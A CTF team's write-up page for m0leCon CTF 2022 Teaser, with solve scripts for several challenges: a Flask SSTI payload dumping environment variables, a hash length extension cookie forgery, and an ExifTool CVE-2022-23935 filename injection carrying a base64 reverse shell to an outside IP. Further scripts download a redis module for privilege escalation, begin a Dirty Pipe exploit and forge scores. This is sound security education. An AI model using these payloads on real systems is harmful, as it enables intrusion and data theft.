for c in st):  print(st) PTC - Pwn The Circles!  Are you better than Cookiezi? Show it to us and win a fantastic prize 🚩! (P.S. the flag will appear in your profile page)\nClick\nAuthor: @Pixel_01\n In this challenge we are given an enormous JAR file, that contains a modified version of opsu!. The big difference is that it reports the scores to a custom server, and comes with 3 songs that are recognized on the server. Our goal is to register a user on the server, then upload a score for each song that is above a certain threshold. At this point, we will get the flag from the website.\nThe first level is extremely short, and ends up uploading a score even if you lose. Sniffing the connection going from Java, shows that is requests a key from https://ptc.m0lecon.fans/api/key and then sends some JSON-data with a base64-encoded blob to https://ptc.m0lecon.fans/api/upload afterwards. Searching for these strings do not yield any hits, but after diffing with the original game we find the class itdelatrisu.opsu.i.D which contains the scoreboard logic.\nEssentially, the game will\n Convert the scoreboard data to JSON Send the username to the key API Decrypt the resulting key using a key derived from the username Encrypt the scoreboard data with the decrypted key  It will also hash the entire JAR file with sha256, and upload it together with the scoreboard data. This functions as a crude anti-tampering gimmick, but is easily bypassed.\nThe following code is able to upload the scores by enabling the various data parts one by one.\nfrom hashlib import pbkdf2_hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import requests import base64 import json  name = b\"iHqikf5sip8TLiFZ\" salt = base64.b64decode(\"cHdudGhlbTBsZQ==\") iv = name  key1 = pbkdf2_hmac(  hash_name = 'sha256',  password = name,  salt = salt,  iterations = 65536,  dklen = 32 )  key2_enc = base64.b64decode(requests.get(\"https://ptc.m0lecon.fans/api/key\", headers={\"Id\":name.decode(), \"User-Agent\":\"Java/16.0.2\"}).content) key2 = pbkdf2_hmac(  hash_name = 'sha256',  password = unpad(AES.new(key1[:32], AES.MODE_CBC, iv).decrypt(key2_enc), 16),  salt = salt,  iterations = 65536,  dklen = 32 )  data = {\"map\":{\"MID\":196716,\"title\":\"You Suffer\",\"artist\":\"Napalm Death\",\"creator\":\"MillhioreF\",\"version\":\"Easy\",\"score\":931,\"MSID\":67814},\"player\":\"iHqikf5sip8TLiFZ\",\"checksum\":\"c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\"} data = {\"map\":{\"MID\":87431,\"title\":\"FREEDOM DiVE\",\"artist\":\"xi\",\"creator\":\"Nakagawa-Kanon\",\"version\":\"FOUR DIMENSIONS\",\"score\":132408003,\"MSID\":39804},\"player\":\"iHqikf5sip8TLiFZ\",\"checksum\":\"c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\"} data = {\"map\":{\"MID\":31337,\"title\":\"Skype x Can Can\",\"artist\":\"Ara Potato\",\"creator\":\"Real\",\"version\":\"Hard\",\"score\":3133773314,\"MSID\":47078},\"player\":\"iHqikf5sip8TLiFZ\",\"checksum\":\"c30df1bb74ad3ac7283f11c24324dab92efaec45b6e4df71c3620c1a575d8997\"}  data = pad(json.dumps(data).encode(), 16) enc = AES.new(key2, AES.MODE_CBC, iv).encrypt(data) data = base64.b64encode(enc).decode() res = requests.post(\"https://ptc.m0lecon.fans/api/upload\", json={\"data\":data}, headers={\"Id\":name.decode(), \"User-Agent\":\"Java/16.0.2\"}) print(res.content) print(base64.b64decode(res.content)) YASM  Yet Another Super Mario, a Turin based platform game! (You may need to install libglew-dev libglfw3 via apt; you also need to extract client_required files.7z inside the same folder as the client. Tested on Ubuntu 20.04, Mint 20.3, MX 21.1 baremetal)\nConnect using: ./client 108.128.200.4\nAuthor: @matpro\n The included client runs a Super Mario…eh…inspired game. It is very wonky, and runs at a speed where you can’t really control the character at all. After proceeding through the map, mostly skipping dangers by luck, we get to a series of walls with a flag on the very right side of the map.\nThere’s much to go into for this challenge, but the main parts is that the game actually runs on the server, and the client is just sending keypresses to the remote. It gets the game state, represented as matrices, sent back every now and then. Thus, modifying the game client does not give us the possibility to pass through walls or something like that. The only thing the client does, is to send keys and render the game state.\nThe protocol represents keypresses as two DWORDs, and can send multiple of them in the same packet. The first DWORD says if the player is pressing the UP-key, or if any of the buttons “F, L, A, G” are pressed. The second DWORD says if the player is going left or right, as it can’t do both at the same time.\nOn the server side, there is a check that if your x-position is larger than 400, and the keys “FALG” (in that order) are pressed, it will actually send you the flag. But that position is far to the right, through the various walls that we cannot get through.\nLuckily, there is a bug in the game, that was found by experimentation.\nif ( keypress == GLFW_KEY_UP ) {  if ( y_pos  0.65 \u0026\u0026 (y_pos == (*a2)[2 * v19] || y_pos == (*a2)[2 * v19 + 1]) )  {  Mat4::operator*=(\u0026v24, \u0026typ);  y_accelerate = 5;  }  LODWORD(keypress) = 0; } if ( HIDWORD(keypress) == GLFW_KEY_RIGHT ) {  if ( v30  -40.15 \u0026\u0026 !is_moving_left \u0026\u0026 (should_send_matrix || y_pos = a3[v19 + 1]) )  Mat4::operator*=(\u0026v23, \u0026txn);  is_moving_left = 0;  HIDWORD(keypress) = 0; } if ( HIDWORD(keypress) == GLFW_KEY_LEFT ) {  if ( v30  0.0 \u0026\u0026 is_moving_left == 1 \u0026\u0026 (should_send_matrix || y_pos = a3[v19 - 1]) )  Mat4::operator*=(\u0026v23, \u0026txp);  is_moving_left = 1;  HIDWORD(keypress) = 0; } if ( !should_send_matrix \u0026\u0026 a3[v19]  y_pos ) {  if ( is_moving_left )  Mat4::operator*=(\u0026v23, \u0026txn);  else  Mat4::operator*=(\u0026v23, \u0026txp); } should_send_matrix = 1 - should_send_matrix; Whenever we are going left, a flag is set. There is also a flag that toggles every game tick, which decides if it should send the matrix or not. It is possible to hit multiple of these blocks in a single tick, and end up glitching through a wall. However, it is not very reliable in the client program and there is a time limit before the server disconnects us, so we need to perfect it – or write our own client.\nfrom pwn import * from struct import pack import random  UR = 13337 UL = 13338 U = 0x109 L = 0x107 R = 0x106  context.log_level = \"debug\" context.log_file = './log.txt'  def get_data(key):  if key == UR:  return pack(\", U, R)  elif key == UL:  return pack(\", U, L)  elif key in [U, 70, 65, 76, 71]:  return pack(\", key, 0)  elif key in (L, R):  return pack(\", 0, key)  def submit(keypresses):  for keys in keypresses:  tosend = b\"\"  if hasattr(keys, \"__iter__\"):  for key in keys:  tosend += get_data(key)  else:  tosend = get_data(keys)   print(tosend)  r.send(tosend)  # time.sleep(0.05)  gg = r.recv(timeout=0.1)  if b\"ptm{\" in gg:  print(gg)  print(\"WWTTTFFFF\")  pause()  elif b\"died\" in gg:  print(gg)  print(\"ded\")  pause()  r = remote(\"108.128.200.4\", 11223) r.send(b\"newgame\") print(r.recv()) time.sleep(3) submit([R,UR]) submit([UR]*20) submit([UR]*10)  submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) for _ in range(100)]) submit([(UR,UR,UR,L,UR,UR,L,UR,UR,L,UR,UR) for _ in range(100)])   submit([70, 65, 76, 71]) # FALG r.interactive() The script tries desperately to jump while holding right in the beginning, hoping to make it to the walls. This does not always work, because the game is not really deterministic with network latency. Then it will try to fuzz inputs a bit, glitching through the walls. Once it is reasonably sure that it has reached the flag, it will send the keypresses for “FALG” and wait.\nptm{thr0ugh_7he_wall5!_but_wher3_1s_peach??}\nweb Dumb Forum  Author: @italianconcerto\nDescription: You’re telling me you can’t break such a simple forum?\n We are provided with a Flask application that contains a user system, but it is also possible to post public posts to the index page.\nThe flag is set in an environment variable in the Dockerfile. Knowing this we know our goal is to get access to the system environment variables.\nAfter reading through the source code of the Flask application, we find the following route (/profile) where the user can edit and view its profile.\n@app.route('/profile', methods=['GET', 'POST']) @login_required def profile():  with open('app/templates/profile.html') as p:  profile_html = p.read()   profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)   if(current_user.about_me == None):  current_user.about_me = \"\"  return render_template_string(profile_html) Flask has existing methods for rendering template, for example render_template. However, in this case we see that the profile route reads the template file and uses string format instead to inject the username, email, and about_me of the user into the template.\nIn profile.html we can see this:\nh5 class=\"card-title\"Username: %sh5 pEmail: %sp p class=\"\"About me: %sp The form is parsed through EditProfileForm, which contains:\nclass EditProfileForm(FlaskForm):  username = StringField('Username', validators=[DataRequired()])  about_me = TextAreaField('About me', validators=[Length(min=0, max=1000)])  submit = SubmitField('Submit')   def __init__(self, original_username, *args, **kwargs):  super(EditProfileForm, self).__init__(*args, **kwargs)  self.original_username = original_username   def validate_username(self, username):  for c in \"}{\":  if c in username.data:  abort(400)  #raise ValidationError('Please use valid characters.')  if username.data != self.original_username:  user = User.query.filter_by(username=self.username.data).first()  if user is not None:  abort(409)  #raise ValidationError('Please use a different username.')   def validate_about_me(self, about_me):  for c in \"}{\":  if c in about_me.data:  abort(400) The form validates the username and about_me fields, and checks if they contains either of }{ (which are typically used with SSTI (Server Side Template Injection). But the form does not allow editing the email field of the user.\nWe find another form, RegistrationForm which is used during registration, and it is here, and only here, the email of the user is set. The validation of the email does however not include the }{ validation, which means we can register with an email and potentially perform a SSTI.\nclass RegistrationForm(FlaskForm):  username = StringField('Username', validators=[DataRequired()])  email = StringField('Email', validators=[DataRequired(), Email()])  password = PasswordField('Password', validators=[DataRequired()])  password2 = PasswordField('Repeat Password', validators=[DataRequired(), EqualTo('password')])  submit = SubmitField('Register')   def validate_username(self, username):  for c in \"}{\":  if c in username.data:  raise ValidationError('Please use valid characters.')  user = User.query.filter_by(username=username.data).first()  if user is not None:  raise ValidationError('Please use a different username.')   def validate_email(self, email):  user = User.query.filter_by(email=email.data).first()  if user is not None:  raise ValidationError('Please use a different email address.') The email field does however include an email validator: email = StringField('Email', validators=[DataRequired(), Email()])\nWe see that this validator comes from wtforms: from wtforms.validators import ValidationError, DataRequired, Email, EqualTo\nLooking into the source code of the wtforms validator, we see that it uses the email-validator library.\nBy looking at the specification for the local-part of an email, we see that the following characters are allowed in an email:\n  uppercase and lowercase Latin letters A to Z and a to z digits 0 to 9 printable characters !#$%\u0026’*+-/=?^_`{|}~ dot ., provided that it is not the first or last character and provided also that it does not appear consecutively (e.g., John..Doe@example.com is not allowed).[5] space and special characters “(),:;@[] are allowed with restrictions (they are only allowed inside a quoted string, as described in the paragraph below, and in that quoted string, any backslash or double-quote must be preceded once by a backslash); comments are allowed with parentheses at either end of the local-part; e.g., john.smith(comment)@example.com and (comment)john.smith@example.com are both equivalent to john.smith@example.com.   This means that an email such as {{self.__dict__}}@a.a will be considered a valid email.\nWe now know that our goal is to perform a SSTI on the email field.\nWe can use the get_flashed_messages of Flask to get the __globals__ of the application. And with this we generate a payload that returns the environment variables of the system, resulting in the flag. {{get_flashed_messages.__globals__.os.environ}}@z.c\nEmail: environ({ \"PATH\":\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"HOSTNAME\":\"35250adbc3f0\", \"LANG\":\"C.UTF-8\", \"GPG_KEY\":\"A035C8C19219BA821ECEA86B64E628F8D684696D\", \"PYTHON_VERSION\":\"3.10.4\", \"PYTHON_PIP_VERSION\":\"22.0.4\", \"PYTHON_SETUPTOOLS_VERSION\":\"58.1.0\", \"PYTHON_GET_PIP_URL\":\"https://github.com/pypa/get-pip/raw/38e54e5de07c66e875c11a1ebbdb938854625dd8/public/get-pip.py\", \"PYTHON_GET_PIP_SHA256\":\"e235c437e5c7d7524fbce3880ca39b917a73dc565e0c813465b7a7a329bb279a\", \"FLASK_APP\":\"main.py\", \"FLAG\":\"ptm{d1d_u_f1nd_th3_r1ckr0ll?}\", \"HOME':\"/home/app\"} )@a.a FLAG: ptm{d1d_u_f1nd_th3_r1ckr0ll?}\nFancy Notes  Hello my friend, I need your help! As you know, in Italy food is very important and I’m not good at it… but I want to surprise my parents with a special recipe. I asked Marco Giordano for an advice, he is very good, but he didn’t want to reveal his secrets… I know he saves his recipes on Fancy Notes, find a way to steal them.\nAuthor: @RxThorn\n Attached to the challenge is a Python Flask application.\nIn the app folder inside of the models.py we can see that the FLAG is first read from the environemnt variable FLAG and in the init_db function we see that a new note with the flag is created and append to the admin users note. So in order to get the flag we will probably have to read the note as admin.\nIf we inspect the notes route in routes.js we see that it will call the method get_user, this method will then call serialize_user with the first part of the base64 decoded value of the cookie (the part before the first |). The serialize_user will parse the user_string and return a python dictionary. The problem with the parsing is that if the username property is set more than one time, the last username will be selected. If it is possible to add another username to the user_string, we will be able to become admin.\nIf we inspect the authorization for the application inside the utils.py file, we see that the whole authentication and authorizatio scheme of the application relies on a SHA256 hash. The problem with this is that we can use a length extension attack in order to add another username to the user string. This means that since the serialize_user method only is a dictonary, we can append another username to the user_string and then generate a valid hash (via hash extension) in order to become the admin user. To exploit this vulnerability we can use the HashPump project https://github.com/bwall/HashPump to perform the attack.\nTo run the exploit we must first register a valid user. This will give us a valid base64 encoded user cookie that contains SECRET KEY + user_string. The data we want to extend the string with is ,username=admin. The small hurdle we must overcome is that in order to perform the attack, we must know the length of the secret key. This can be brute forced since the /notes endpoint will give HTTP response code 302 if the user cookie is invalid, and a 200 OK if it is valid. We can therefore brute force the length of the secret key.\nimport base64 import hashpumpy import requests import re   def make_request(user_string, signature):  notes_url = \"https://fancynotes.m0lecon.fans/notes\"  encode_me = f\"{user_string}|{signature}\"   user_string = f\"{user_string.decode('raw_unicode_escape')}|{signature}\"  cookie_value = base64.b64encode(user_string.encode('raw_unicode_escape')).decode()    cookies = dict(user=cookie_value)  response = requests.get(notes_url, cookies=cookies, allow_redirects=False)  return response  def is_valid_signature(user_string, signature):  resp = make_request(user_string, signature)  if resp.status_code == 200:  return True  else:  return False   if __name__ == '__main__':  print(\"Pwning...\")   hexdigest = \"REPLACE_WITH_RESULT_BASE64_DECODED_HASH_PART\"  pattern = \"ptm\\{(.*)\\}\"   for x in range(1, 100):  digest, msg = hashpumpy.hashpump(hexdigest, \"username=hackerman,locale=en\", \",username=admin\", x)  if is_valid_signature(msg, digest):  print(f\"Correct length is: {x}\")  response = make_request(msg, digest)  result = re.search(pattern, response.text)  flag = result.group(0)  print(f\"Flag is: {flag}\")  break If we run the script with the correctly configured values we get the flag:\nFLAG:ptm{pleaseD0NOTUseCr3am1nCarbon4r4!}\nmisc Placey  I was really sad when r/place ended so I built my own. Mirror 1 Mirror 2 Mirror 3 Mirror 4\nNote: flag is in /root/flag.txt\nAuthor: @0000matteo0000\n We get access to a website that implements the Reddit April fools feature, where you can log in and place pixels on the board. The website is very unstable and slow, and the feature does not really work, but it quickly shows that it is not actually required either.\nThe website also features a user system, where you can upload profile pictures. Uploading random (non-image) files gives the following error message in return:\nOnly image file types are accepted (JPEG, PNG, GIF). Powered by ExifTool 12.37\nSearching for this particular version of ExifTool, shows that it is vulnerable to CVE-2022-23935, where a file name that ends with “|” (pipe symbol) leads to command execution.\nGlancing over the really annoying CSRF token system, and the fact that the website was not always responding, this it the meat of the exploit when using cURL\n-F \"avatar=@gg.jpg;filename=x|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8zLjE0MC4yMjMuNy8xMDUzNCAwPiYxIA== |base64 -d | bash |\"\nSince certain symbols break the command, encoding it let us use slash symbols and such. The above payload is a reverse shell.\nOnce dropped on the server, we discover that the flag is not readable by us.\nappuser@placey4:/root$ ls -la ls -la total 16 drwx---r-x 1 root root 19 May 12 19:45 . drwxr-xr-x 1 root root 52 May 13 18:05 .. -rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc -rw-r--r-- 1 root root 161 Jul 9 2019 .profile -rwxrwxr-x 1 root root 275 May 12 19:34 entrypoint.sh -rw-r----- 1 root redisgroup 45 May 12 19:45 flag.txt drwxr-xr-x 1 root root 21 May 12 19:45 quart drwxr-xr-x 1 root root 6 May 12 19:44 redis It is only readable by users in the redisgroup group, and appuser is not part of it. The usual privesc options like sudo require password to run, so we can’t use that either. However, the redis server is running as the redis user, so if we can trick the redis server into reading the file for us, it should work out.\nGetting redis to actually do that, however, was not very easy. Especially for a warmup challenge. We ended up compiling a custom module for redis that allowed command execution, then using the limited python installation to download it\npython3 -c \"import urllib.request; s = urllib.request.urlopen('https://vps.here/module.so').read(); fd=open('/tmp/module.so','wb');fd.write(s);fd.close()\" appuser@placey4:/tmp/$ chmod +x module.so chmod +x a.so appuser@placey4:/tmp/$ redis-cli redis-cli MODULE LOAD /tmp/module.so OK system.exec \"id\" uid=101(redisuser) gid=101(redisgroup) groups=101(redisgroup) system.exec \"cat /root/flag.txt\" ptm{th3r3_w1ll_n3v3r_b3_@_pl@c3y_l1k3_h0m3y} crypto MOO  One of the cows in our farm started to say weird numbers instead of MOOing, can you guess what it’s saying?\nnc challs.m0lecon.it 1753 Author: @brooklyn\n The code we are given has two parts. The first is normal RSA encryption, using some special prime generation functions, and the flag is encrypted using this cryptosystem. We are given (N, c, e), i.e. all the public parameters. The second part has some mystery functions f1 and f2. The server lets us call these functions with our own inputs, but only 10 times.\nDoing some code searches online, quickly reveals that these functions represent how to calculate multiplicative order. This is not something you can do over a semiprime without having intimate knowledge about the factorization, so it gives us enough information so that we can factor N if we give smart inputs.\nI based my solution on this post where it says that differences in which primes divide the order of each factor can lead to a non-trivial factor. We quickly cooked up a proof-of-concept for this, and while it doesn’t work on every try, it works after a few attempts.\nfrom pwn import * from math import gcd from Crypto.Util.number import long_to_bytes  a=124846525121166472890127769845656706959834701767553316679575342375728606681436245953703527478773456698735316531921607496638484885416740029028542605893861455745313937474271661656548230159065196413238268640890 factors = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997]  r = remote(\"challs.m0lecon.it\", 1753)  _ = r.recvline() n = int(r.recvlineS().strip().split(\" = \")[1]) c = int(r.recvlineS().strip().split(\" = \")[1]) e = int(r.recvlineS().strip().split(\" = \")[1]) r.sendlineafter(b\"Choose a value: \", str(a).encode()) M = int(r.recvlineS().strip().split(\" = \")[1]) p = max(gcd(n,(pow(a, M//f, n)-1)%n) for f in factors) print(p) q = n // p assert p * q == n and p1 and q1 d = pow(e, -1, (p-1)*(q-1)) print(long_to_bytes(pow(c, d, n))) ","wordCount":"7797","inLanguage":"en","datePublished":"2022-05-15T11:05:16+02:00","dateModified":"2022-05-15T11:05:16+02:00","author":[{"@type":"Person","name":"maritio_o"},{"@type":"Person","name":"PewZ"},{"@type":"Person","name":"klarz"},{"@type":"Person","name":"poiko"},{"@type":"Person","name":"zup"},{"@type":"Person","name":"UnblvR"},{"@type":"Person","name":"webhak"},{"@type":"Person","name":"Blissy"},{"@type":"Person","name":"Sithis"},{"@type":"Person","name":"Kat"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://bootplug.io/posts/ctf/m0leconctf_2022/"},"publisher":{"@type":"Organization","name":"Blog | bootplug","logo":{"@type":"ImageObject","url":"https://bootplug.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bootplug.io/ accesskey=h title="Blog (Alt + H)"><img src=/images/bootplug.png alt=logo aria-label=logo height=45>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://bootplug.io/archive title=Archive><span>Archive</span></a></li><li><a href=https://bootplug.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://bootplug.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://bootplug.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bootplug.io/>Home</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/>Posts</a>&nbsp;»&nbsp;<a href=https://bootplug.io/posts/ctf/>CTFs</a></div><h1 class=post-title>m0leCon CTF 2022 Teaser</h1><div class=post-description>Writeups from m0leCon CTF 2022 qualifier</div><div class=post-meta>May 15, 2022&nbsp;·&nbsp;37 min&nbsp;·&nbsp;maritio_o, PewZ, klarz, poiko, zup, UnblvR, webhak, Blissy, Sithis, Kat</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pwn aria-label=pwn>pwn</a><ul><li><a href=#dirtyrat aria-label=dirtyRAT>dirtyRAT</a></li><li><a href=#ptmlist aria-label=ptmList>ptmList</a></li><li><a href=#flagmail aria-label=FlagMail>FlagMail</a></li></ul></li><li><a href=#rev aria-label=rev>rev</a><ul><li><a href=#circuitry-magic aria-label="Circuitry magic">Circuitry magic</a></li><li><a href=#ptc---pwn-the-circles aria-label="PTC - Pwn The Circles!">PTC - Pwn The Circles!</a></li><li><a href=#yasm aria-label=YASM>YASM</a></li></ul></li><li><a href=#web aria-label=web>web</a><ul><li><a href=#dumb-forum aria-label="Dumb Forum">Dumb Forum</a></li><li><a href=#fancy-notes aria-label="Fancy Notes">Fancy Notes</a></li></ul></li><li><a href=#misc aria-label=misc>misc</a><ul><li><a href=#placey aria-label=Placey>Placey</a></li></ul></li><li><a href=#crypto aria-label=crypto>crypto</a><ul><li><a href=#moo aria-label=MOO>MOO</a></li></ul></li></ul></div></details></div><div class=post-content><h1 id=pwn>pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h1><h2 id=dirtyrat>dirtyRAT<a hidden class=anchor aria-hidden=true href=#dirtyrat>#</a></h2><blockquote><p><strong>Author:</strong> @Gaaat</p><p><strong>Description</strong>: I bought this backdoor from some hacking/carding group on Telegram but I&rsquo;m starting to suspect that I have been scammed&mldr;
Can anyone help me access the only file I really need?</p><p><code>nc dirtyrat.challs.m0lecon.it 10010</code></p></blockquote><p>We were given a binary and the source code.</p><p>It was mentioned early on that the title might be a wordplay on the recent <a href=https://dirtypipe.cm4all.com/>Dirty Pipe vulnerability</a>. But we disregarded the idea for a while. Also, we noticed a <code>splice()</code> in the code and found that a bit weird.</p><p>Running the binary, we get the following menu:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">60 seconds, PWN!
Welcome to

         88  88                                    88888888ba          db    888888888888
         88  &#34;&#34;                ,d                  88      &#34;8b        d88b        88
         88                    88                  88      ,8P       d8&#39;`8b       88
 ,adPPYb,88  88  8b,dPPYba,  MM88MMM  8b       d8  88aaaaaa8P&#39;      d8&#39;  `8b      88
a8&#34;    `Y88  88  88P&#39;   &#34;Y8    88     `8b     d8&#39;  88&#34;&#34;&#34;&#34;88&#39;       d8YaaaaY8b     88
8b       88  88  88            88      `8b   d8&#39;   88    `8b      d8&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;8b    88
&#34;8a,   ,d88  88  88            88,      `8b,d8&#39;    88     `8b    d8&#39;        `8b   88
 `&#34;8bbdP&#34;Y8  88  88            &#34;Y888      Y88&#39;     88      `8b  d8&#39;          `8b  88
                                          d8&#39;
                                         d8&#39;                                               CLI
Victim info:	Linux bc31d47e2ff0 5.10.60-051060-generic #202108180439 SMP Wed Aug 18 08:59:30 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Whoami:		rat

Available commands:
1)List files in folder.
2)Read file from our curated list of important files :)
3)Write data to one file from our curated list of important files :)
4)Win the CTF for me pls ≧◡≦
-1)Quit
</code></pre><p>If we list files, we see there is a file called <code>flag</code> which we cannot read:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">Your choice: 1
total 1072
drwxr-xr-x 2 root root    4096 May 15 08:50 .
drwxrwxrwt 1 root root   20480 May 15 08:50 ..
-rw-r--r-- 1 user user      80 May 12 12:53 cards
-rw-r--r-- 1 user user      48 May 12 12:53 conf
-rwxr-xr-x 1 rat  rat  1048040 May 12 12:53 dirtyRAT
-rw-r--r-- 1 user user      31 May 12 12:53 flag
-rw-r--r-- 1 user user     132 May 12 12:53 pasw
-rw-r--r-- 1 user user     885 May 12 12:53 priv
-rw-r--r-- 1 user user      43 May 12 12:53 secr
</code></pre><p>What is interesting here is that the <code>conf</code> file contains a list of files we
may read:</p><pre tabindex=0><code class="language-shell=" data-lang="shell=">Your choice: 2
Insert filename: conf
How many bytes to read? (Max 127 eheheeheh): 127
File content:
##DIRTY CONFIG HEADER
conf
cards
priv
secr
pasw
PJ!�
File read
</code></pre><p>With this information and reading the code, we tried to exploit the binary.</p><p>First, we tried to modify the config, but struggled since the only file we had
write permissions to was <code>dirtyRAT</code>. Then we understood that the trouble with
persmissions fit perfectly into the Dirty Pipe vulnerability. The version
number you might have noticed under the banner is a kernel version vulnerable
to Dirty Pipe. Also, the <code>dirtyRAT</code> binary contains all the code required to
exploit the vulnerability. All we needed to do was to run them in the correct
order:</p><ol><li>Fill the pipe with arbitrary data to set the PIPE_BUF_FLAG_CAN_MERGE flag</li><li>Drain the pipe</li><li>Splice 128 bytes from the priv file. We do this because there was a read in
the way that we had to stop</li><li>Splice 22 bytes from the conf file to skip header</li><li>Add <code>flag</code> to the conf file</li></ol><p>Then after having <code>flag</code> successfully put into the conf file, we could read the
flag file by choosing menu option 2.</p><p>And then we got the flag <code>ptm{W4it_wa5nt_1t_r3ad_0nly!?}</code></p><p>Here is the solve script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># This exploit template was generated via:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $ pwn template --host dirtyrat.challs.m0lecon.it --port 10010 ./files/chall/dirtyRAT</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./files/chall/dirtyRAT&#39;</span>)
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>HOST <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;dirtyrat.challs.m0lecon.it&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> int(args<span style=color:#f92672>.</span>PORT <span style=color:#f92672>or</span> <span style=color:#ae81ff>10010</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>local</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> gdb<span style=color:#f92672>.</span>debug([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, gdbscript<span style=color:#f92672>=</span>gdbscript, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path] <span style=color:#f92672>+</span> argv, <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>remote</span>(argv<span style=color:#f92672>=</span>[], <span style=color:#f92672>*</span>a, <span style=color:#f92672>**</span>kw):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> connect(host, port)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>GDB:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>attach(io, gdbscript<span style=color:#f92672>=</span>gdbscript)
